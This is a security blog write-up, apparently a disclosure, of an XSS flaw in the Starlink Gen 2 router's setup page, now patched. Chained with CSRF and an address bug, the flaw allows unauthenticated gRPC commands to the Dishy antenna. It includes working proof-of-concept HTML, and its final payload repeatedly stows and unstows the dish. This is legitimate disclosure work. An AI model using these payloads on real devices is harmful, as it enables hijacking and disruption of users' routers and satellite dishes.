# TL;DR

---

A `Cross-Site Scripting (XSS)` vulnerability in the initial captive portal page of the second-generation router could allow an attacker to take control of the `router` and `Dishy`.

# **The Basics**

---

- **Product :** Starlink Router Gen 2
- **Tested Version :** 2022.32.0 (The fix is in versions 2023.48.0 and up)
- **Bug-class** : XSS(Cross-Site Scripting)

# ****Overview of the Vulnerability****

---

![img1.webp](/blog/2023-Starlink-Router-Gen2-XSS/img1.webp)

This vulnerability arises due to insufficient input filtering for the `ssid` and `password` parameters on the initial router setup page ([http://192.168.1.1/setup](http://192.168.1.1/setup)).

```html
<html>
	<body>
		<h1>Proof of Concept</h1>
		<form id="PoC" method="POST" action="http://192.168.1.1/setup">
			<input type="hidden" name="ssid" value='" onfocus=javascript:alert(`XSS`); autofocus="'>
			<!-- <input type="hidden" name="password" value='" onfocus=javascript:alert(`XSS`); autofocus="'> -->
		</form>
		<script type="text/javascript">
			document.addEventListener("DOMContentLoaded", function() {
				document.getElementById("PoC").submit();
			});
		</script>
	</body>
<html>
```

This `Cross-Site Scripting (XSS)` vulnerability can be triggered in conjunction with a `CSRF (Cross-Site Request Forgery)` attack as shown in the above PoC (Proof of Concept).

# **Exploit**

---

Typically, the captive portal page should only be activated at the router's internal address, 192.168.1.1. However, in older routers, there was a bug that unexpectedly allowed access to the captive portal page at Dishy's internal address, 192.168.100.1.

- [http://192.168.1.1/setup](http://192.168.1.1/setup) → The captive portal page is displayed correctly.

- [http://192.168.100.1/setup](http://192.168.100.1/setup) → The captive portal page is also displayed at this address.
    
    ![http://192.168.100.1/setup](/blog/2023-Starlink-Router-Gen2-XSS/img3.png)
    

(Normally, access to the captive portal page should not be possible at Dishy's internal address, 192.168.100.1.)

Using such a bug along with the `Cross-Site Scripting (XSS)` vulnerability allows for the circumvention of the browser's `Same-Origin Policy (SOP)`, enabling control over both the Router and Dishy.

[192.168.100.1_PoC.mov](/blog/2023-Starlink-Router-Gen2-XSS/192.168.100.1_PoC.mov)

It can be confirmed that the same `Cross-Site Scripting (XSS)` vulnerability occurs at the address [http://192.168.100.1/setup](http://192.168.100.1/setup) as well.

Now, let's examine through an example how this bug can be exploited to gain control of the `Router` and `Dishy`.

## Dishy Stow Request Analysis

---
<center>

![Starlink Dishy Stow](/blog/2023-Starlink-Router-Gen2-XSS/gif1.gif)
</center>
When the `Stow` command is issued from the administrator interface, the following HTTP Request is sent to `Dishy`


(Note: The `Stow` command allows the `Dishy` antenna to be folded for movement or storage.)

```
POST /SpaceX.API.Device.Device/Handle HTTP/1.1
Host: 192.168.100.1:9201
Content-Length: 8
x-grpc-web: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
content-type: application/grpc-web+proto
Accept: */*
Origin: http://dishy.starlink.com
Referer: http://dishy.starlink.com/
Accept-Encoding: gzip, deflate, br
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

�}
```

This Request's header contains several important pieces of information.

- **x-grpc-web: 1**
    
    This indicates the use of the **`gRPC-Web`** protocol.
    
    (**`gRPC-Web`** is a protocol that allows web clients to make gRPC calls to a server.)
    
- **content-type: application/grpc-web+proto**
    
    It signifies that the data being transmitted uses the gRPC protocol and is encoded in the protobuf format.
    
- **Request Body**
    
    ![Dishy Stow Request body (Hex)](/blog/2023-Starlink-Router-Gen2-XSS/img4.png)
    
    Dishy Stow Request body (Hex)
    
    ```html
    \x00\x00\x00\x00\x03\xef\xbf\xbd\x7d\x00
    ```
    
    The request body contains data in the **`grpc-web+proto`** format, which likely holds the details of the **`Stow`** command.
    

Combining this information, when a user issues the **`Stow`** command through the administrator interface, this command is transmitted to the **`Dishy`** device using the gRPC protocol. (This will cause the Dishy device to fold into a more manageable state for movement.)

However, upon examining the Request, we can see that there is no authentication for the user sending this request.

This implies that someone other than the administrator could potentially send the same request to unauthorizedly control the **`Dishy`**.

Nevertheless, this security flaw requires the attacker to have physical access to the local network, which limits the scope of the attack compared to those that can occur remotely.

## **Possibility and Limitations of CSRF Attacks**

---

This brings us to the question, "Can't we just send the same request payload to perform a `CSRF (Cross-Site Request Forgery)` attack?"

While `CSRF (Cross-Site Request Forgery)` might be a possible scenario, such attacks are limited by the browser's `Same-Origin Policy (SOP)`.

gRPC requires a specific **`content-type`** header, which is **`application/grpc-web+proto`**.

However, `SOP (the Same-Origin Policy)`  mandates that this header is stripped by the browser when sending requests from a different origin.

This restriction prevents external sources from sending gRPC requests to **`Dishy`**.

## XSS: An Effective Way to Bypass SOP

---

Normally, the `Same-Origin Policy (SOP)` restricts web browsers from making requests to different origins.

However, by exploiting an `Cross-Site Scripting (XSS)` vulnerability, an attacker can execute scripts within the victim's web browser.

These scripts are considered as originating from the same source (i.e., the website the victim is currently accessing).

As a result, the `Same-Origin Policy (SOP)` recognizes requests generated by these scripts as coming from the same origin, and thus the `Same-Origin Policy (SOP)` restrictions do not apply in this case.

Therefore, in the case of `CSRF (Cross-Site Request Forgery)` attacks exploiting `Cross-Site Scripting (XSS)` vulnerabilities, especially for requests like gRPC that require a specific content-type header,

the attack script runs within the victim's browser, treating it as a legitimate request, thus including the specific content-type header in the request.

## Exploit PoC (Proof of Concept)

---

Therefore, leveraging the **`Cross-Site Scripting (XSS)`** vulnerability and the previously mentioned bug, the Payload for sending a gRPC request to **`Dishy`** would be as follows:

```html
<html>
	<body>
		<h1>Dishy Stow and Unstow</h1>
		<form id="PoC" method="POST" action="http://192.168.100.1/setup">
			<!-- <input type="hidden" name="ssid" value='" onfocus=javascript:alert(`XSS`); autofocus="'> -->
			<input type="hidden" name="password" value='"><script>for(let i=0;i<100;i++){setTimeout(()=>{var xhr=new XMLHttpRequest();xhr.open("POST","http://192.168.100.1:9201/SpaceX.API.Device.Device/Handle",true);xhr.setRequestHeader("x-grpc-web","1");xhr.setRequestHeader("Content-Type","application/grpc-web+proto");xhr.onreadystatechange=()=>{if(xhr.readyState==4&&xhr.status==200){console.log(xhr.responseText);}};xhr.send(new Uint8Array([0,0,0,0,3,146,125,0]).buffer);setTimeout(()=>{var xhr2=new XMLHttpRequest();xhr2.open("POST","http://192.168.100.1:9201/SpaceX.API.Device.Device/Handle",true);xhr2.setRequestHeader("x-grpc-web","1");xhr2.setRequestHeader("Content-Type","application/grpc-web+proto");xhr2.onreadystatechange=()=>{if(xhr2.readyState==4&&xhr2.status==200){console.log(xhr2.responseText);}};xhr2.send(new Uint8Array([0,0,0,0,5,146,125,2,8,1]).buffer);},1000);},i*2000);}</script><input type="hidden'/>
		</form>
		<script type="text/javascript">
			document.addEventListener("DOMContentLoaded", function() {
				document.getElementById("PoC").submit();
			});
		</script>
	</body>
<html>
```
